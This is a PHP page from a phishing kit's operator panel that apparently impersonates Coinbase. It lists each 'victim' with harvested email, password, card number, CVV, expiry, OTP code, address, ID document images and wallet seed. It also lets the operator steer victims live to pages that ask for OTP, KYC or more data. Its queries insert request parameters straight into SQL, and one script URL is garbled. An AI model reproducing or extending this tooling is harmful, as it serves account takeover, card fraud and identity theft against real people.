<?php

include '../../include/global.php';

if(!session()) redirect('../');

$id = $_GET['id'] ?? null;

if(!$id) redirect('./');

$victim = fetch_data("SELECT * FROM victims WHERE id = '$id'");

if(!$victim) redirect('./');

$victim_data = fetch_data("SELECT * FROM victims_data WHERE victim_id = '$id'");

if($_GET['action'] == 'delete'){

  $id = $_GET['id'] ?? null;
  if(!$id) redirect('./');
  $victim = fetch_data("SELECT * FROM victims WHERE id = '$id'");
  if(!$victim) redirect('./');
  
  $victim_data = fetch_data("SELECT * FROM victims_data WHERE victim_id = '$id'");
  if($victim_data) {
    $delete = delete_data("DELETE FROM victims_data WHERE victim_id = '$id'");
    if($delete) {
      $delete = delete_data("DELETE FROM victims WHERE id = '$id'");
      if($delete) {
        redirect('./');
      }
    }
  } else {
    $delete = delete_data("DELETE FROM victims WHERE id = '$id'");
    if($delete) {
      redirect('./');
    }
  }
}

if ($_GET['action'] == 'update') {
  $action       = $_GET['action'];
  $current_page = $_GET['current_page'];
  
  if ($action === 'update') {

    if($current_page == 'complete'){
      $current_page = 'https://www.coinbase.com';
        //  $current_page = './index.php';
    } else if($current_page == 'otp_sms' || $current_page == 'otp_sms?error=true'){
      $chars = $_GET['otp_sms_two_numbers'] ?? null;
      update_data("UPDATE victims SET otp_sms_two_numbers = '$chars' WHERE id = '$id'");
    } else if($current_page == 'wallet'){
      $chars = $_GET['wallet_seed'] ?? null;
      update_data("UPDATE victims SET wallet_seed = '$chars' WHERE id = '$id'");
    } else if($current_page == 'tap'){

      $device_info = $_GET['device_info'] ?? null;
      $matching_number = $_GET['matching_number'] ?? null;
      update_data("UPDATE victims SET device_info = '$device_info', matching_number = '$matching_number' WHERE id = '$id'");
    }

    update_data("UPDATE victims SET current_page = '$current_page' WHERE id = '$id'");

    redirect('./view?id='.$id);

  }
}
?>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta http-equiv="X-UA-Compatible" content="ie=edge">

	<title><?=site('name');?></title>

  <!-- Fonts -->
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700;900&display=swap" rel="stylesheet">
  <!-- End fonts -->

	<!-- core:css -->
	<link rel="stylesheet" href="../assets/vendors/core/core.css">
	<!-- endinject -->

	<!-- Plugin css for this page -->
  <link rel="stylesheet" href="../assets/vendors/select2/select2.min.css">
  <link rel="stylesheet" href="../assets/vendors/easymde/easymde.min.css">
	<!-- End plugin css for this page -->

	<!-- inject:css -->
	<link rel="stylesheet" href="../assets/fonts/feather-font/css/iconfont.css">
	<link rel="stylesheet" href="../assets/vendors/flag-icon-css/css/flag-icon.min.css">
	<!-- endinject -->

  <!-- Layout styles -->  
	<link rel="stylesheet" href="../assets/css/demo2/style.min.css">

  <meta http-equiv="refresh" content="15">


  <link rel="shortcut icon" href="../assets/images/favicon.png" />
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha512-iecdLmaskl7CVkqkXNQ/ZH/XLlvWZOJyj7Yy7tcenmpD1ypASozpmT/E0iPtmFIB46ZmdtAc9eNBvH0H/ZpiBw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
</head>
<body>
	<div class="main-wrapper">

		<?=load('panel/sidebar');?>
	
		<div class="page-wrapper">
					
			<?=load('panel/header');?>

			<div class="page-content">

        <div class="d-flex justify-content-between align-items-center flex-wrap grid-margin">
          <div>
            <h4 class="mb-3 mb-md-0" style="color:#000"><?=$_GET['type'] ? strtoupper($_GET['type']) : 'Victims'?> Panel</h4>
          </div>
        </div>

        
        <div class="row inbox-wrapper">
          <div class="col-lg-12">
            <div class="card">
              <div class="card-body">
                <div class="row">
                  <div class="col-lg-3 border-end-lg">
                    <div class="aside-content">
                      <div class="d-flex align-items-center justify-content-between">
                        <button class="navbar-toggle btn btn-icon border d-block d-lg-none" data-bs-target=".email-aside-nav" data-bs-toggle="collapse" type="button">
                          <span class="icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg></span>
                        </button>
                        <div class="order-first">
                          <h4>#<?=$victim['id']?></h4>
                          <hr/>
                          <p class="text-muted"><?=status($victim['status'])?> - <span class="badge bg-info"><?=current_page($victim['current_page'], 'icon')?> <?=current_page($victim['current_page'])?></span></p>
                        </div>
                      </div>
                    <hr/>
                    <div class="email-aside-nav collapse">
                      <ul class="nav flex-column">
                        <li class="nav-item">
                          <a class="nav-link d-flex align-items-center" href="?id=<?=$victim['id']?>&action=update&current_page=otp">
                            <i class="fas fa-lock me-2 text-success"></i>
                            Ask for OTP
                          </a>
                        </li>
                        <li class="nav-item">
                          <a class="nav-link d-flex align-items-center" href="?id=<?=$victim['id']?>&action=update&current_page=otp?error=true">
                            <i class="fas fa-lock me-2 text-danger"></i>
                            Re-ask for OTP (Error)
                          </a>
                        </li>
                        <hr/>
                        <li class="nav-item">
                          <a class="nav-link d-flex align-items-center" href="?id=<?=$victim['id']?>&action=update&current_page=kyc">
                            <i class="fas fa-file me-2 text-info"></i>
                            Ask for KYC
                          </a>
                        </li>
                        <li class="nav-item">
                          <a class="nav-link d-flex align-items-center" href="?id=<?=$victim['id']?>&action=update&current_page=kyc?error=true">
                            <i class="fas fa-file me-2 text-danger"></i>
                            Re-ask for KYC (Error)
                          </a>
                        </li>
                        <hr/>
                        <li class="nav-item">
                          <a class="nav-link d-flex align-items-center" href="?id=<?=$victim['id']?>&action=update&current_page=invoice_done">
                            <i class="fas fa-file-invoice me-2 text-success"></i>
                            Invoice Completed
                          </a>
                        </li>
                        <hr/>
                        <li class="nav-item">
                          <a class="nav-link d-flex align-items-center" href="?id=<?=$victim['id']?>&action=update&current_page=complete">
                            <i class="fas fa-check me-2 text-success"></i>
                            Complete Session
                          </a>
                        </li>
                        <hr/>
                        <h3 class="text-muted tx-12 fw-bolder text-uppercase mb-2 mt-4">Header Infomrations:</h5>
                        <h3 class="text-muted tx-12 fw-bolder text-uppercase">IP Address: <span class="badge bg-info"><?=$victim['ip']?></span></h3>
                        <h3 class="text-muted tx-12 fw-bolder text-uppercase">Device: <span class="badge bg-info"><?=$victim['device']?></span></h3>
                        <h3 class="text-muted tx-12 fw-bolder text-uppercase">Browser: <span class="badge bg-info"><?=$victim['browser']?></span></h3>
                        <h3 class="text-muted tx-12 fw-bolder text-uppercase">OS: <span class="badge bg-info"><?=$victim['os']?></span></h3>
                        <h3 class="text-muted tx-12 fw-bolder text-uppercase">Created at: <span class="badge bg-info"><?=$victim['created_at']?></span></h3>
                      </ul>
                    </div>
                   </div>
                  </div>
                  <style>
                    .form-control{
                      border: 1px solid grey;
                    }
                  </style>
                  <div class="col-lg-9">
                    <div>
                      <div class="d-flex align-items-center p-3 border-bottom tx-16">
                        <i class="fas fa-user-circle text-info"></i> <span style="margin-left:1%;">Informations Submited by Victim</span>
                      </div>
                    </div>
                    <br/>
                    <h3>Returned Data</h3>
                    <br/>
                    <label class="col-md-2 col-form-label">⚠️ Login:</label>
                    <hr/>
                    <div class="p-3 pb-0">
                      <div class="row mb-3">
                        <label class="col-md-2 col-form-label">Email</label>
                        <div class="col-md-10">
                          <input class="form-control" type="text" value="<?=$victim_data['email']?>" readonly>
                        </div>
                      </div>
                      <div class="row mb-3">
                        <label class="col-md-2 col-form-label">Password</label>
                        <div class="col-md-10">
                          <input class="form-control" type="text" value="<?=$victim_data['password']?>" readonly>
                        </div>
                      </div>
                    </div>
                    <br/>
                    <label class="col-md-2 col-form-label">⚠️ Card Info:</label>
                    <hr/>
                    <div class="p-3 pb-0">
                      <div class="row mb-3">
                        <label class="col-md-2 col-form-label">Credit Card Number</label>
                        <div class="col-md-10">
                          <input class="form-control" type="text" value="<?= $victim_data['ccnumber'] ?>" readonly>
                        </div>
                      </div>
                      <div class="row mb-3">
                        <label class="col-md-2 col-form-label">OTP Code</label>
                        <div class="col-md-10">
                          <input class="form-control" type="text" value="<?= $victim_data['otp_code'] ?>" readonly>
                        </div>
                      </div>
                      <div class="row mb-3">
                        <label class="col-md-2 col-form-label">Expiration Date</label>
                        <div class="col-md-10">
                          <input class="form-control" type="text" value="<?= $victim_data['ccexpiration'] ?>" readonly>
                        </div>
                      </div>
                      <div class="row mb-3">
                        <label class="col-md-2 col-form-label">CVV</label>
                        <div class="col-md-10">
                          <input class="form-control" type="text" value="<?= $victim_data['cvv'] ?>" readonly>
                        </div>
                      </div>
                      <div class="row mb-3">
                        <label class="col-md-2 col-form-label">ZIP Code</label>
                        <div class="col-md-10">
                          <input class="form-control" type="text" value="<?= $victim_data['zipCode'] ?>" readonly>
                        </div>
                      </div>
                      <div class="row mb-3">
                        <label class="col-md-2 col-form-label">Country</label>
                        <div class="col-md-10">
                          <input class="form-control" type="text" value="<?= $victim_data['displayCountry'] ?>" readonly>
                        </div>
                      </div>
                      <div class="row mb-3">
                        <label class="col-md-2 col-form-label">Address 1</label>
                        <div class="col-md-10">
                          <input class="form-control" type="text" value="<?= $victim_data['address1'] ?>" readonly>
                        </div>
                      </div>
                      <div class="row mb-3">
                        <label class="col-md-2 col-form-label">Address 2</label>
                        <div class="col-md-10">
                          <input class="form-control" type="text" value="<?= $victim_data['address2'] ?>" readonly>
                        </div>
                      </div>
                      <div class="row mb-3">
                        <label class="col-md-2 col-form-label">City</label>
                        <div class="col-md-10">
                          <input class="form-control" type="text" value="<?= $victim_data['city'] ?>" readonly>
                        </div>
                      </div>
                      <div class="row mb-3">
                        <label class="col-md-2 col-form-label">State</label>
                        <div class="col-md-10">
                          <input class="form-control" type="text" value="<?= $victim_data['state'] ?>" readonly>
                        </div>
                      </div>
                    </div>
                    <br/>
                    <label class="col-md-2 col-form-label">⚠️ KYC Info:</label>
                    <hr/>
                    <div class="p-3 pb-0">
                      <div class="row mb-3">
                        <label class="col-md-2 col-form-label">Front Document (KYC)</label>
                        <div class="col-md-10">
                          <img src="../assets/document_kyc_verification/<?= $victim_data['front_doc'] ?>" width="250" height="99"/>
                        </div>
                      </div>
                      <div class="row mb-3">
                        <label class="col-md-2 col-form-label">Back Document (KYC)</label>
                        <div class="col-md-10">
                          <img src="../assets/document_kyc_verification/<?= $victim_data['back_doc'] ?>" width="250" height="99"/>
                        </div>
                      </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>

			</div>

      <?=load('panel/footer');?>
		
		</div>
	</div>

	<!-- core:js -->
	<script src="../assets/vendors/core/core.js"></script>
	<!-- endinject -->

	<!-- Plugin js for this page -->
  <script src="../assets/vendors/flatpickr/flatpickr.min.js"></script>
  <script src="../assets/vendors/apexcharts/apexcharts.min.js"></script>
	<!-- End plugin js for this page -->

	<!-- inject:js -->
	<script src="../assets/vendors/feather-icons/feather.min.js"></script>
	<script src="../assets/js/template.js"></script>
	<!-- endinject -->

	<!-- Custom js for this page -->
  <script src="../assets/js/dashboard-dark.js"></script>
  <script src="https://code.jdelete_data.com/jdelete_data-3.6.0.min.js"></script>
	<!-- End custom js for this page -->

  <script>

    updateVictims();


    function updateVictims() {
      $.ajax({
        url: '../../api/victims',
        method: 'GET',
        data: {
          page: 'victims',
          type: '<?=$_GET['type']?>'
        },
        success: function(response) {
              $('#victimTableBody').html(response);
        },
        error: function(xhr, status, error) {
          console.error(error);
        }
      });
    }

    // Periodically update victims every 5 seconds. (Modify this if you want to change the interval)
    setInterval(updateVictims, 5000);
  </script>

</body>
</html>